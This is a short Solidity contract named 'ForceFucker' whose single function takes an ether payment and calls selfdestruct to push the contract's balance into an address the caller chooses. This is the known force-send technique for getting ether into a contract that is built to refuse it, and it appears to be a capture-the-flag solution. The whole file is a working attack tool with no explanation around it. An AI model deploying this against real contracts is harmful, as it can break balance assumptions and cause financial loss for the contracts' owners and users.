pragma solidity >=0.8.2 <0.9.0;
contract ForceFucker {
    function handle(address payable contr) external payable {
        require(msg.value > 0);
        selfdestruct(contr);
    }
}
